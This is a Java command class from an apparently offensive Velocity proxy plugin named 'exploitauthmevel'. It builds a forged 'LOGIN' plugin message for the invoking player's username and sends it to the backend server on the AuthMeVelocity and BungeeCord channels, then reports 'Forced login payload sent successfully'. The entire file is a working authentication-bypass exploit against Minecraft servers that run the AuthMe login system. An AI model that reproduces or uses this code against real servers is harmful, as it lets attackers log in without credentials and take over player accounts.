package dev.wrrulos.exploitauthmevel.commands;

import com.velocitypowered.api.command.CommandSource;
import com.velocitypowered.api.command.SimpleCommand;
import com.velocitypowered.api.proxy.Player;
import com.velocitypowered.api.proxy.messages.MinecraftChannelIdentifier;
import dev.wrrulos.exploitauthmevel.Exploitauthmevel;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class ExploitCommand implements SimpleCommand {
    public static final MinecraftChannelIdentifier IDENTIFIER = MinecraftChannelIdentifier.from("authmevelocity:main");
    public static final MinecraftChannelIdentifier BUNGEE_IDENTIFIER = MinecraftChannelIdentifier.from("bungeecord:main");

    /**
     * Executes the command.
     *
     * @param invocation the invocation
     */
    @Override
    public void execute(Invocation invocation) {
        // Get the source and arguments
        CommandSource source = invocation.source();
        String[] args = invocation.arguments();

        // Check if the source is a player
        if (!(source instanceof Player player)) {
            Component message = Component.text(Exploitauthmevel.PREFIX + "This command can only be executed by a player.", NamedTextColor.RED);
            source.sendMessage(message);
            return;
        }

        // Create a new byte array output stream
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(b);

        try {
            // Write the payload to the output stream
            out.writeUTF("LOGIN");
            out.writeUTF(player.getUsername());

            // Create a string builder
            StringBuilder stringBuilder = new StringBuilder();

            // Append the arguments to the string builder
            if (args.length > 1) {
                for (int i = 1; i < args.length; i++) {
                    stringBuilder.append(args[i]).append(" ");
                }
            }

            // Write the string builder to the output stream
            out.writeUTF(stringBuilder.toString().trim());
        } catch (IOException ignored) {}

        // Send the payload to the server
        player.getCurrentServer().ifPresent(server -> {
            server.sendPluginMessage(IDENTIFIER, b.toByteArray());
            server.sendPluginMessage(BUNGEE_IDENTIFIER, b.toByteArray());
        });

        Component message = Component.text(Exploitauthmevel.PREFIX + "Forced login payload sent successfully", NamedTextColor.GREEN);
        player.sendMessage(message);
    }
}
